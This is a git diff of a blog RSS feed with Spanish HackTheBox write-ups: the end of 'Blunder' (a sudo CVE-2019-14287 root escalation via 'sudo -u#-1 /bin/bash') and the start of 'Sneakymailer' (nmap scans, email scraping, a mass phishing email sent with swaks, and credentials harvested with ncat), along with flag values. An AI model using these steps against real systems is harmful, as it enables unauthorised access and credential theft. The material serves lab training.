+  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Con la nueva credencial migramos exitosamente como el usuario &lt;code&gt;hugo&lt;/code&gt;, nos dirigimos a su directorio personal y visualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
+Password: 
+hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ whoami
+hugo
+hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cd /home/hugo/
+hugo@blunder:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
+hugo@blunder:~$ cat user.txt 
+0ad6d2d9c835f7f10ba8518d29dedc4b
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Enumerando los privilegios a nivel de &lt;code&gt;sudoers&lt;/code&gt;, vemos que el usario &lt;code&gt;hugo&lt;/code&gt;, puede ejecutar una bash como cualquier usuario a exepción de root. Aprovechando esto podemos migrar al usuario &lt;code&gt;shaun&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hugo@blunder:~$ sudo -u shaun bash
+shaun@blunder:/home/hugo$ whoami
+shaun
+shaun@blunder:/home/hugo$ id
+uid=1000(shaun) gid=1000(shaun) groups=1000(shaun),4(adm),24(cdrom),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que el usuario &lt;code&gt;shaun&lt;/code&gt;,se encuntra en el grupo &lt;code&gt;lxd&lt;/code&gt;, asi que podriamos aprovecharnos de eso para convertirnos en &lt;code&gt;root&lt;/code&gt;, pero en esta ocasión vamos a realizarlo de otra manera ya que si vemos la version de sudo que se esta empleando corresponde a una vulnerable.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;shaun@blunder:/home/hugo$ sudo --version
+Sudo version 1.8.25p1
+Sudoers policy plugin version 1.8.25p1
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.25p1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Buscando un exploit publico encontramos uno referente a &lt;code&gt;security bypass&lt;/code&gt; y para versiones menores a la 1.8.27, al ser esta una versión menor podemos usar este exploit.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit sudo 1.8.
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+sudo 1.8.0 &amp;lt; 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escalation                                                               | linux/local/25134.c
+sudo 1.8.0 &amp;lt; 1.8.3p1 - Format String                                                                                                                 | linux/dos/18436.txt
+Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation                                                                     | linux/local/37710.txt
+Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                                                                                     | linux/local/42183.c
+Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                                                                                          | linux/local/48052.sh
+Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                                                                                                    | linux/dos/47995.txt
+sudo 1.8.27 - Security Bypass                                                                                                                        | linux/local/47502.py
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Revisamos el codigo del exploit y vemos que solo tenemos que ejecutar la siguiente instrucción &lt;code&gt;sudo -u#-1 /bin/bash&lt;/code&gt;, pero debemos hacerlo como el usuario &lt;code&gt;hugo&lt;/code&gt; ya que este tenia el privilegio a nivel de &lt;code&gt;sudoers&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Una vez ya como el ususario &lt;code&gt;root&lt;/code&gt; nos dirigimos a su directorio personal y visualizamos la segunda flag &lt;code&gt;root.txt.&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hugo@blunder:~$ sudo -u#-1 /bin/bash
+root@blunder:/home/hugo# whoami
+root
+root@blunder:/home/hugo# cd /root
+root@blunder:/root# cat root.txt 
+dd6d458838b1d2c778b789eeb79ab063
+&lt;/code&gt;&lt;/pre&gt;
+
+</description>
+        <pubDate>Wed, 14 Jun 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Blunder</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Blunder</guid>
+        
+        <category>information leaked</category>
+        
+        <category>Bludit CMS explotation</category>
+        
+        <category>bypass IP Blocking (X-Forwarded-For Header)</category>
+        
+        <category>Image File Upload (Playing with .htaccess)</category>
+        
+        <category>Abusing sudo privilege (CVE-2019-14287)</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Netmon - htb writeup</title>
@@ -6011,892 +6623,6 @@ Rama 'main' configurada para hacer seguimiento a la rama remota 'main' de 'origi
         
         
         <category>articulos</category>
-        
-      </item>
-    
-      <item>
-        <title>Maquina Sneakymailer - htb writeup</title>
-        <description>&lt;p&gt;Hoy vamos a resolver una máquina &lt;code&gt;hackthebox&lt;/code&gt; de dificultad &lt;code&gt;media&lt;/code&gt;, la cual explotaremos a partir de información lekeada y realizando un ataque masivo de email, después migraremos a otro usuario abusando de un &lt;code&gt;pypi server&lt;/code&gt; creando un paquete malicioso y finalmente escalaremos privilegios como el usuario &lt;code&gt;root&lt;/code&gt; abusando de un privilegio de sudoers en &lt;code&gt;pip3&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Sneakymailer
-❯ ls
- Sneakymailer
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
-mkt () {
-	mkdir {nmap, content, scripts}
-}
-❯ mkt
-❯ ls
- content   nmap   scripts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.197
-PING 10.10.10.197 (10.10.10.197) 56(84) bytes of data.
-64 bytes from 10.10.10.197: icmp_seq=1 ttl=63 time=2582 ms
-
---- 10.10.10.197 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 2582.173/2582.173/2582.173/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.197 -oG openPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-08 21:19 GMT
-Initiating SYN Stealth Scan at 21:19
-Scanning 10.10.10.197 [65535 ports]
-Discovered open port 80/tcp on 10.10.10.197
-Discovered open port 22/tcp on 10.10.10.197
-Discovered open port 21/tcp on 10.10.10.197
-Discovered open port 25/tcp on 10.10.10.197
-Discovered open port 8080/tcp on 10.10.10.197
-Discovered open port 143/tcp on 10.10.10.197
-Discovered open port 993/tcp on 10.10.10.197
-Completed SYN Stealth Scan at 21:20, 20.33s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.197
-Host is up, received user-set (0.31s latency).
-Scanned at 2023-04-08 21:19:57 GMT for 20s
-Not shown: 63699 closed tcp ports (reset), 1829 filtered tcp ports (no-response)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT     STATE SERVICE    REASON
-21/tcp   open  ftp        syn-ack ttl 63
-22/tcp   open  ssh        syn-ack ttl 63
-25/tcp   open  smtp       syn-ack ttl 63
-80/tcp   open  http       syn-ack ttl 63
-143/tcp  open  imap       syn-ack ttl 63
-993/tcp  open  imaps      syn-ack ttl 63
-8080/tcp open  http-proxy syn-ack ttl 63
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 20.46 seconds
-           Raw packets sent: 98589 (4.338MB) | Rcvd: 88844 (3.554MB)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p21,22,25,80,143,993,8080 10.10.10.197 -oN targeted
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-08 21:21 GMT
-Nmap scan report for 10.10.10.197
-Host is up (0.40s latency).
-
-PORT     STATE SERVICE  VERSION
-21/tcp   open  ftp      vsftpd 3.0.3
-22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
-|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
-|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
-25/tcp   open  smtp     Postfix smtpd
-|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
-80/tcp   open  http     nginx 1.14.2
-|_http-title: Did not follow redirect to http://sneakycorp.htb
-|_http-server-header: nginx/1.14.2
-143/tcp  open  imap     Courier Imapd (released 2018)
-|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION STARTTLS UIDPLUS SORT NAMESPACE ACL completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT
-|_ssl-date: TLS randomness does not represent time
-| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
-| Subject Alternative Name: email:postmaster@example.com
-| Not valid before: 2020-05-14T17:14:21
-|_Not valid after:  2021-05-14T17:14:21
-993/tcp  open  ssl/imap Courier Imapd (released 2018)
-|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION UIDPLUS SORT NAMESPACE ACL AUTH=PLAIN completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT
-| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
-| Subject Alternative Name: email:postmaster@example.com
-| Not valid before: 2020-05-14T17:14:21
-|_Not valid after:  2021-05-14T17:14:21
-|_ssl-date: TLS randomness does not represent time
-8080/tcp open  http     nginx 1.14.2
-|_http-open-proxy: Proxy might be redirecting requests
-|_http-title: Welcome to nginx!
-|_http-server-header: nginx/1.14.2
-Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 78.06 seconds
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Puerto&lt;/th&gt;
-      &lt;th&gt;Servicio&lt;/th&gt;
-      &lt;th&gt;Versión&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;21&lt;/td&gt;
-      &lt;td&gt;FTP&lt;/td&gt;
-      &lt;td&gt;vsftpd 3.0.3&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;22&lt;/td&gt;
-      &lt;td&gt;SSH&lt;/td&gt;
-      &lt;td&gt;OpenSSH 7.9p1&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;25&lt;/td&gt;
-      &lt;td&gt;SMTP&lt;/td&gt;
-      &lt;td&gt;Postfix smtpd&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;80&lt;/td&gt;
-      &lt;td&gt;HTTP&lt;/td&gt;
-      &lt;td&gt;nginx 1.14.2&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;143&lt;/td&gt;
-      &lt;td&gt;IMAP&lt;/td&gt;
-      &lt;td&gt;Courier Imapd&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;993&lt;/td&gt;
-      &lt;td&gt;IMAP/SSL&lt;/td&gt;
-      &lt;td&gt;Courier Imapd&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;8080&lt;/td&gt;
-      &lt;td&gt;HTTP&lt;/td&gt;
-      &lt;td&gt;nginx 1.14.2&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Comenzando primeramente intentaremos conectarnos como el usuario &lt;code&gt;anonymous&lt;/code&gt; por el servicio &lt;code&gt;ftp&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.197
-Connected to 10.10.10.197.
-220 (vsFTPd 3.0.3)
-Name (10.10.10.197:fmiracle): anonymous
-530 Permission denied.
-Login failed.
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos que no contamos con acceso asi que proseguiremos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver el gestor de contenido de los servicios &lt;code&gt;http&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.197
-http://10.10.10.197 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], IP[10.10.10.197], RedirectLocation[http://sneakycorp.htb], Title[301 Moved Permanently], nginx[1.14.2]
-http://sneakycorp.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.197], JQuery, Script, Title[Employee - Dashboard], X-UA-Compatible[IE=edge], nginx[1.14.2]
-❯ whatweb http://10.10.10.197:8080
-http://10.10.10.197:8080 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.197], Title[Welcome to nginx!], nginx[1.14.2]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;whatweb&lt;/code&gt; nos reporta que se esta aplicando virtual hosting, concretamente al dominio &lt;code&gt;http://sneakycorp.htb&lt;/code&gt; asi que comenzemos agregandolo a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;echo &quot;10.10.10.197 sneakycorp.htb&quot; &amp;gt;&amp;gt; /etc/hosts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Vamos a proceder a abrir la pagina web.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos observar un proyecto que nos habla de pypi, pero que es &lt;code&gt;pypi&lt;/code&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;El Python Package Index o PyPI es el repositorio de software oficial para aplicaciones de terceros en el lenguaje de programación Python.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Observamos un potencial de correos filtrados de la compañia&lt;/p&gt;
-
-&lt;p&gt;Parceamos los correos filtrados usando la siguente expresión y los exportamos a un fichero de nombre &lt;code&gt;mails.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -s -X GET &quot;http://sneakycorp.htb/team.php&quot; | grep &quot;sneakymailer&quot; | html2text | xargs | tr ' ' ',' &amp;gt; mails.txt
-❯ /bin/cat mails.txt
-tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sneakymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsilva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sneakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@sneakymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothymooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zenaidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.htb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como antes nos reporto &lt;code&gt;nmap&lt;/code&gt; el servicio &lt;code&gt;imap&lt;/code&gt; se encuentra activo y como ahora disponemos de una lista de correos, podemos tratar de enviar un correo como cualquier usuario y ver si se nos permite de estar mal configurado.&lt;/p&gt;
-
-&lt;p&gt;Para eso usaremos la herramienta &lt;code&gt;swaks&lt;/code&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;para instalar la herramienta solo basta con hacer un apt install swaks&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Especificaremos con los comandos &lt;code&gt;from&lt;/code&gt; el correo origen, &lt;code&gt;--to&lt;/code&gt; la lista de correos que obtuvimos, en el &lt;code&gt;body&lt;/code&gt; podemos tratar de enviar un enlace a un servidor &lt;code&gt;http&lt;/code&gt; que nos compartiremos de manera local, de modo que si alguno de los usuarios destinatarios esta abriendo el correo y pinche en el enlace, causara que nos envie una solicitud.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ swaks --from fmiracle@sneakymailer.htb --to tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sneakymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsilva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sneakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@sneakymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothymooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zenaidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.htb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb --body &quot;Entra aqui -&amp;gt; http://10.10.16.2/test&quot; --server 10.10.10.197
-=== Trying 10.10.10.197:25...
-=== Connected to 10.10.10.197.
-&amp;lt;-  220 debian ESMTP Postfix (Debian/GNU)
- -&amp;gt; EHLO hack4u
-&amp;lt;-  250-debian
-&amp;lt;-  250-PIPELINING
-&amp;lt;-  250-SIZE 10240000
-&amp;lt;-  250-VRFY
-&amp;lt;-  250-ETRN
-&amp;lt;-  250-STARTTLS
-&amp;lt;-  250-ENHANCEDSTATUSCODES
-&amp;lt;-  250-8BITMIME
-&amp;lt;-  250-DSN
-&amp;lt;-  250-SMTPUTF8
-&amp;lt;-  250 CHUNKING
- -&amp;gt; MAIL FROM:&amp;lt;fmiracle@sneakymailer.htb&amp;gt;
-&amp;lt;-  250 2.1.0 Ok
- -&amp;gt; RCPT TO:&amp;lt;tigernixon@sneakymailer.htb&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;80&lt;/code&gt; y recibimos una petición post.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 80
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::80
-Ncat: Listening on 0.0.0.0:80
-Ncat: Connection from 10.10.10.197.
-Ncat: Connection from 10.10.10.197:39458.
-POST /test HTTP/1.1
-Host: 10.10.16.2
-User-Agent: python-requests/2.23.0
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: keep-alive
-Content-Length: 185
-Content-Type: application/x-www-form-urlencoded
-
-firstName=Paul&amp;amp;lastName=Byrd&amp;amp;email=paulbyrd%40sneakymailer.htb&amp;amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Tramos la data y lo exportamos a un ficherito llamando &lt;code&gt;credentials.txt&lt;/code&gt;, donde podemos ver las credenciales de el usuario &lt;code&gt;Paul&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php --interactive
-Interactive mode enabled
-
-php &amp;gt; echo urldecode(&quot;firstName=Paul&amp;amp;lastName=Byrd&amp;amp;email=paulbyrd%40sneakymailer.htb&amp;amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&quot;);
-firstName=Paul&amp;amp;lastName=Byrd&amp;amp;email=paulbyrd@sneakymailer.htb&amp;amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht&amp;amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht
-
-❯ /bin/cat credentials.txt
-firstName=Paul
-lastName=Byrd
-email=paulbyrd@sneakymailer.htb
-password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht
-rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora provaremos conectarnos con &lt;code&gt;telnet&lt;/code&gt; al puerto &lt;code&gt;143&lt;/code&gt; con esas credenciales.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Puedes guiarte de este articulo donde se explica a detalle como realizar la conexión con telnet y hacer uso de los parametros.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet/&quot;&gt;https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ telnet 10.10.10.197 143
-Trying 10.10.10.197...
-Connected to 10.10.10.197.
-Escape character is '^]'.
-* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
-a1 LOGIN paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht
-* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
-a1 OK LOGIN Ok.
-a2 LIST &quot;&quot; &quot;*&quot;
-* LIST (\Unmarked \HasChildren) &quot;.&quot; &quot;INBOX&quot;
-* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Trash&quot;
